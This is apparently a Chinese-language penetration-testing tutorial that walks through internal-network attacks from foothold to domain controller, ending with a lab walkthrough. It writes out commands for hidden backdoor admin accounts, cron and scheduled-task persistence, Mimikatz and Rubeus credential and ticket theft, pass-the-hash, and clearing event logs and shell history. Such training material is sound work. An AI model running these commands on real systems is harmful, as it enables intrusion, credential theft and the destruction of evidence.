# 03 - 内网渗透完整链路

> 优先级：★★☆ 进阶
> 
> **法律声明**：以下内容仅用于合法授权的安全测试。未经授权渗透测试是违法行为。

## 概述

内网渗透区别于外网"单点突破"，核心是 **"隐蔽探查 → 横向移动 → 权限提升 → 持久控制"** 的全链路作战。

### 内网渗透 vs 外部渗透

| 维度 | 外部渗透 | 内网渗透 |
|---|---|---|
| 攻击面 | 公网暴露的服务、Web应用 | 内部服务、域环境、共享资源、信任关系 |
| 防护强度 | 防火墙、WAF、IDS/IPS | 内部信任导致策略宽松 |
| 攻击目标 | 获取初始立足点 | 横向移动、控制关键资产 |
| 检测难度 | 相对容易被发现 | 内部流量混杂，检测难度大 |

### 常见内网环境
- **工作组环境**：小型网络，无集中身份验证
- **域环境（AD）**：大中型企业常用，内网渗透重点
- **云内网环境**：VPC、虚拟网络、容器网络

---

## 阶段1：巩固初始立足点

拿到 WebShell/反弹 Shell 后首要任务是稳定控制权。

### 1.1 环境信息收集

```bash
# Windows
systeminfo                    # 系统版本、补丁级别
ipconfig /all                 # 网卡IP、定位内网网段
route print                   # 路由表
tasklist /svc                 # 进程列表（检查EDR/杀软）
net start                     # 已启动服务
whoami /all                   # 当前用户权限

# Linux
uname -a                      # 系统版本
ifconfig / ip addr            # 网络配置
route -n                      # 路由表
ps aux                        # 进程列表
id                            # 当前用户权限
```

### 1.2 凭据信息收集

| 凭据来源 | 位置/工具 | 说明 |
|---|---|---|
| 系统内存 | Mimikatz、ProcDump | 从 LSASS 转储明文密码和 NTLM Hash |
| SAM数据库 | `C:\Windows\System32\config\SAM` | 本地账户Hash |
| NTDS.dit | `C:\Windows\NTDS\ntds.dit` | 域控上所有域用户Hash |
| 浏览器密码 | Chrome/Firefox/Edge | 浏览器密码管理器 |
| RDP历史 | 注册表 | 远程桌面保存凭据 |
| 配置文件 | Web.config、.env | 数据库连接字符串 |
| Wi-Fi密码 | `netsh wlan show profiles` | 无线网络密码 |

### 1.3 持久化控制

```bash
# Windows - 隐藏账号
net user backdoor$ Backdoor@2024 /add    # $符号隐藏账号
net localgroup administrators backdoor$ /add

# Windows - 计划任务
schtasks /create /tn "Update" /tr "C:\tmp\beacon.exe" /sc daily /st 03:00

# Linux - crontab
echo "* * * * * root /tmp/ssh_backdoor.sh" >> /etc/crontab

# Linux - SSH公钥
echo "攻击者公钥" >> /root/.ssh/authorized_keys
```

### 1.4 痕迹清理
- 删除 WebShell 上传记录（IIS/Apache 日志）
- Windows: 清理 `C:\Windows\System32\winevt\Logs\Security.evtx`
- Linux: 清空 `/var/log/auth.log`
- 工具伪装：重命名为 `svchost.exe`、`nginx.exe`

---

## 阶段2：内网信息收集（绘制"攻击地图"）

### 2.1 存活主机探测

```bash
# fscan - 内网综合扫描（推荐）
fscan -h 192.168.1.0/24 -sP -rate 300 -o alive.txt

# ICMP扫描
for /l %i in (1,1,254) do @ping -n 1 -w 50 192.168.1.%i | findstr "TTL"

# nmap
nmap -sn 192.168.1.0/24
```

### 2.2 端口与服务扫描

```bash
# fscan - 仅扫高危端口
fscan -h 192.168.1.0/24 -p 22,445,3306,6379,8080,5985 -o port_service.txt

# nmap - 精准扫描
nmap -sS -p 22,80,443,3389,445 -sV 192.168.1.0/24
```

**重点关注服务**：
- 445 (SMB) — 永恒之蓝、弱口令
- 3306 (MySQL) — 弱口令、UDF提权
- 6379 (Redis) — 未授权访问
- 8080/80 (Web) — Log4j、Struts2
- 5985 (WinRM) — 远程管理接口

### 2.3 域环境信息收集

```bash
# 基础域信息
net config workstation
net view /domain
nltest /dclist:域名

# 域用户和组
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain

# 高级域侦察
# BloodHound/SharpHound - AD攻击路径可视化分析
# PowerView - 自动化域侦察
```

---

## 阶段3：横向移动技术体系

### 3.1 远程服务利用

| 技术 | 端口 | 所需权限 | 特点 |
|---|---|---|---|
| **PsExec** | 445 SMB | 管理员 | 上传服务程序执行，返回SYSTEM，特征明显 |
| **WMI** | 135 DCOM | 管理员 | 无文件落地，较隐蔽 |
| **SMBExec** | 445 SMB | 管理员 | 通过SMB命名管道执行命令 |
| **WinRM** | 5985/5986 | 管理员 | 较新Windows默认启用 |
| **RDP** | 3389 | 任意用户 | 交互式图形界面 |
| **DCOM** | 135 | 管理员 | 通过COM对象远程执行 |
| **任务计划** | 445 | 管理员 | 远程创建计划任务，较隐蔽 |

### 3.2 凭据重用攻击

#### Pass-the-Hash (PtH)
用 NTLM 哈希认证，无需明文密码：

```bash
# Mimikatz
sekurlsa::pth /user:Administrator /domain:test.local /ntlm:哈希值 /run:cmd.exe

# Impacket
python3 psexec.py -hashes LM哈希:NT哈希 域名/用户@目标IP

# CrackMapExec (批量)
crackmapexec smb 192.168.1.0/24 -u admin -H NT哈希

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u admin -H NT哈希
```

#### Pass-the-Ticket (PtT)
注入窃取的 Kerberos 票据：

```bash
# 导出所有Kerberos票据
mimikatz # sekurlsa::tickets /export

# 注入TGT票据
mimikatz # kerberos::ptt ticket_admin@krbtgt~DOMAIN.LOCAL.kirbi

# 验证
klist

# Rubeus (.NET)
Rubeus.exe dump /nowrap
Rubeus.exe ptt /ticket:<base64_ticket>
```

#### Overpass-the-Hash
用 NT Hash 换取合法 TGT，流量更"正常"：

```bash
# 用Hash请求TGT
Rubeus.exe asktgt /user:用户名 /rc4:NT哈希 /domain:域名 /dc:域控
```

### 3.3 利用漏洞横向移动

| 漏洞 | CVE | 影响 |
|---|---|---|
| 永恒之蓝 | MS17-010 | SMB远程代码执行 |
| ZeroLogon | CVE-2020-1472 | 域控身份验证绕过 |
| PrintNightmare | CVE-2021-1675/34527 | 打印服务远程代码执行 |
| PetitPotam | CVE-2021-36942 | NTLM中继攻击域控 |

---

## 阶段4：权限提升

### 4.1 Windows 提权

- **服务配置错误**：服务路径未引号、弱权限
- **Potato 攻击**：JuicyPotato、RoguePotato、GodPotato、SweetPotato
- **令牌窃取**：SeImpersonate权限利用
- **内核漏洞**：根据补丁情况选择对应Exploit
- **计划任务**：以高权限运行的任务

### 4.2 Linux 提权

```bash
# SUID提权
find / -user root -perm -4000 -print 2>/dev/null

# Cron任务
cat /etc/crontab
ls -la /etc/cron.*

# Capabilities
getcap -r / 2>/dev/null

# 内核版本查exploit
uname -a
```

### 4.3 域提权攻击

| 攻击手法 | 原理 | 利用条件 |
|---|---|---|
| **Kerberoasting** | 破解服务账户TGS票据 | 任意域用户 |
| **AS-REP Roasting** | 破解未启用预认证用户的票据 | 知道用户名 |
| **DCSync** | 模拟域控同步获取所有Hash | DS-Replication-Get-Changes权限 |
| **Golden Ticket** | 用krbtgt Hash伪造任意用户TGT | 获取krbtgt Hash |
| **约束委派攻击** | 利用委派配置伪造票据 | 服务账户配置了约束委派 |
| **ZeroLogon** | 绕过域控身份验证 | 目标未打补丁 |

---

## 阶段5：权限维持与痕迹清理

### 5.1 权限维持技术

- **注册表后门**：Winlogon Helper、Image File Execution Options
- **WMI事件订阅**：永久事件订阅触发后门
- **DLL劫持**：替换合法程序加载的DLL
- **黄金票据**：即使密码修改仍可持久访问
- **白银票据**：用服务账户Hash伪造TGS

### 5.2 痕迹清理

```bash
# Windows - 清理安全日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 清理RDP登录记录
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /va /f

# Linux - 清理登录日志
echo > /var/log/auth.log
echo > /var/log/wtmp
echo > /var/log/btmp
history -c  # 清理命令历史
```

---

## 实战案例：Brute4Road 靶场攻击路径

```
Redis未授权访问 → SUID提权 → 内网隧道搭建 → 横向移动 → 约束委派攻击 → 域控
```

1. 外网 Redis 6379 未授权访问，利用主从复制RCE获取Shell
2. SUID提权：`base64` 命令有SUID权限，读取flag
3. 搭建内网隧道（frp/gost → socks5代理）
4. 内网扫描发现域控、MSSQL服务器、WordPress站点
5. WordPress WPCargo插件RCE → 获取数据库凭证
6. MSSQL sa账户爆破成功 → SweetPotato提权
7. SharpHound收集域信息 → 发现MSSQLSERVER约束委派
8. Rubeus申请TGT → S4U2Self伪造管理员票据 → 拿下域控
